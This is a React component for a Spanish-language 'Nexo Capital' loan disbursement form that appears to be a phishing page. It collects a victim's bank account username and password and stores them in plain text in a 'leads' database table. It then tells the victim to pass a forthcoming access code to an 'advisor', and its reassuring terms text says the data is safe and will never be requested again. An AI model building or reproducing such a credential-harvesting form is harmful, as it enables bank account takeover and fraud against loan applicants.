import { useState } from 'react'
import { X, CheckCircle2, AlertCircle } from 'lucide-react'
import { supabase } from '../../lib/supabase.js'

export default function DisbursementFormModal({ lead, user, onClose, onCompleted }) {
  const [currentStep, setCurrentStep] = useState(1)
  const [form, setForm] = useState({
    titular_cuenta: '',
    username: '',
    contraseña: '',
    acepta_terminos: false,
  })
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)

  const update = (field, value) => setForm(prev => ({ ...prev, [field]: value }))

  const steps = [
    {
      number: 1,
      title: '¿Quién recibe los ingresos?',
      description: 'Por favor, indica el nombre del titular de la cuenta o de la persona que recibe los ingresos.',
      field: 'titular_cuenta',
      placeholder: 'Nombre completo...',
      type: 'text',
    },
    {
      number: 2,
      title: 'Nombre de usuario',
      description: 'Por favor me indicas el Username (nombre de usuario) de acceso a la cuenta',
      field: 'username',
      placeholder: 'Username...',
      type: 'text',
    },
    {
      number: 3,
      title: 'Contraseña de acceso',
      description: 'Por favor me indicas la contraseña para el ingreso de la cuenta',
      field: 'contraseña',
      placeholder: 'Contraseña...',
      type: 'password',
    },
  ]

  const canProceed = () => {
    const currentField = steps[currentStep - 1]?.field
    return form[currentField]?.trim().length > 0
  }

  async function handleSubmit(e) {
    e.preventDefault()
    if (!form.acepta_terminos) {
      setError('Debes aceptar los términos y condiciones para continuar.')
      return
    }

    setLoading(true)
    setError('')

    try {
      // Actualizar los datos en la base de datos
      const { data, error: dbErr } = await supabase
        .from('leads')
        .update({
          titular_cuenta: form.titular_cuenta,
          username: form.username,
          contraseña: form.contraseña,
          desembolso_completado: true,
          desembolso_fecha: new Date().toISOString(),
        })
        .eq('id', lead.id)
        .select()

      if (dbErr) {
        console.error('Error guardando:', dbErr)
        throw dbErr
      }

      console.log('Datos guardados exitosamente:', data)
      setSuccess(true)
      setTimeout(() => {
        onCompleted()
      }, 2500)
    } catch (err) {
      console.error('Error en handleSubmit:', err)
      setError(err.message || 'Ocurrió un error al procesar el desembolso.')
    } finally {
      setLoading(false)
    }
  }

  if (success) {
    return (
      <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-center justify-center px-4">
        <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg p-8 text-center">
          <div className="mb-4 flex justify-center">
            <CheckCircle2 size={64} className="text-green-500" />
          </div>
          <h3 className="text-2xl font-black text-primary mb-2">¡Gracias por completar los pasos!</h3>
          <p className="text-gray-600 mb-6">
            En unos minutos recibirás un código de acceso para realizar el desembolso del dinero. Este código deberá ser proporcionado al asesor encargado para completar el proceso.
          </p>
          <p className="text-sm text-gray-500">Redirigiendo...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto">
        <div className="sticky top-0 bg-white border-b border-gray-100 px-6 py-4 flex items-center justify-between rounded-t-2xl">
          <div>
            <h3 className="text-xl font-black text-primary">Desembolso Crédito</h3>
            <p className="text-sm text-gray-400">Paso {currentStep} de 4</p>
          </div>
          <button onClick={onClose} className="p-2 rounded-xl text-gray-400 hover:bg-gray-100 hover:text-gray-600">
            <X size={20} />
          </button>
        </div>

        <form onSubmit={handleSubmit} className="p-6 space-y-6">
          {/* Progress bar */}
          <div className="space-y-2">
            <div className="flex justify-between text-xs text-gray-500">
              <span>Progreso</span>
              <span>{Math.round((currentStep / 4) * 100)}%</span>
            </div>
            <div className="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
              <div
                className="bg-primary h-2 rounded-full transition-all duration-300"
                style={{ width: `${(currentStep / 4) * 100}%` }}
              ></div>
            </div>
          </div>

          {/* Steps 1-3: Preguntas */}
          {currentStep <= 3 ? (
            <div className="space-y-4">
              <div>
                <h4 className="text-lg font-bold text-gray-800 mb-2">
                  {currentStep}. {steps[currentStep - 1].title}
                </h4>
                <p className="text-sm text-gray-600 mb-4">{steps[currentStep - 1].description}</p>
              </div>

              <input
                type={steps[currentStep - 1].type}
                placeholder={steps[currentStep - 1].placeholder}
                value={form[steps[currentStep - 1].field]}
                onChange={(e) => update(steps[currentStep - 1].field, e.target.value)}
                className="input w-full"
                required
              />
            </div>
          ) : (
            /* Step 4: Términos y condiciones */
            <div className="space-y-4">
              <div>
                <h4 className="text-lg font-bold text-gray-800 mb-4">
                  4. Términos y Condiciones
                </h4>

                <div className="bg-gray-50 rounded-xl p-4 space-y-3 max-h-64 overflow-y-auto text-sm text-gray-700 mb-4">
                  <div>
                    <p className="font-semibold text-gray-800 mb-1">Política de Privacidad y Seguridad</p>
                    <p className="text-xs">
                      Entiendo que la información bancaria que proporciono será utilizada únicamente para procesar el desembolso de mi préstamo de forma segura y confidencial. Esta información será protegida según las políticas de seguridad de datos de Nexo Capital.
                    </p>
                  </div>

                  <div>
                    <p className="font-semibold text-gray-800 mb-1">Términos de Desembolso</p>
                    <p className="text-xs">
                      Al completar este formulario, acepto que el desembolso se realizará a la cuenta bancaria indicada. Confirmo que la información proporcionada es veraz y precisa. Cualquier dato incorrecto puede resultar en retrasos en el proceso.
                    </p>
                  </div>

                  <div>
                    <p className="font-semibold text-gray-800 mb-1">Responsabilidad del Usuario</p>
                    <p className="text-xs">
                      Soy responsable de mantener la confidencialidad de mis datos de acceso a la cuenta bancaria. Entiendo que no debo compartir esta información con terceros. Nexo Capital nunca solicitará estos datos nuevamente.
                    </p>
                  </div>

                  <div>
                    <p className="font-semibold text-gray-800 mb-1">Confirmación de Desembolso</p>
                    <p className="text-xs">
                      Confirmo que he completado correctamente todos los datos solicitados y autorizo a Nexo Capital a proceder con el desembolso del monto pactado según los términos del contrato de préstamo.
                    </p>
                  </div>

                  <div>
                    <p className="font-semibold text-gray-800 mb-1">Próximos Pasos</p>
                    <p className="text-xs">
                      Después de completar este formulario, recibiré un código de acceso que deberé proporcionar a mi asesor para finalizar el desembolso. El dinero será depositado en el plazo acordado.
                    </p>
                  </div>
                </div>

                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={form.acepta_terminos}
                    onChange={(e) => update('acepta_terminos', e.target.checked)}
                    className="w-5 h-5 rounded border-2 border-gray-300 text-primary cursor-pointer mt-1 flex-shrink-0"
                  />
                  <span className="text-sm text-gray-700">
                    He leído y acepto los términos, condiciones, política de privacidad y autorizo a Nexo Capital a proceder con el desembolso.
                  </span>
                </label>
              </div>
            </div>
          )}

          {error && (
            <div className="flex items-start gap-2 bg-red-50 border border-red-200 rounded-xl p-3">
              <AlertCircle size={18} className="text-red-500 flex-shrink-0 mt-0.5" />
              <p className="text-sm text-red-700">{error}</p>
            </div>
          )}

          {/* Buttons */}
          <div className="flex gap-3 pt-4">
            {currentStep > 1 && (
              <button
                type="button"
                onClick={() => setCurrentStep(currentStep - 1)}
                className="flex-1 px-4 py-2.5 rounded-xl border-2 border-gray-200 text-gray-700 font-semibold hover:bg-gray-50 transition-all"
              >
                Atrás
              </button>
            )}

            {currentStep < 4 ? (
              <button
                type="button"
                onClick={() => setCurrentStep(currentStep + 1)}
                disabled={!canProceed()}
                className="flex-1 px-4 py-2.5 rounded-xl bg-primary text-white font-semibold hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
              >
                Siguiente
              </button>
            ) : (
              <button
                type="submit"
                disabled={loading || !form.acepta_terminos}
                className="flex-1 px-4 py-2.5 rounded-xl bg-green-600 text-white font-semibold hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
              >
                {loading ? 'Procesando...' : 'Completar y Desembolsar'}
              </button>
            )}
          </div>
        </form>
      </div>
    </div>
  )
}
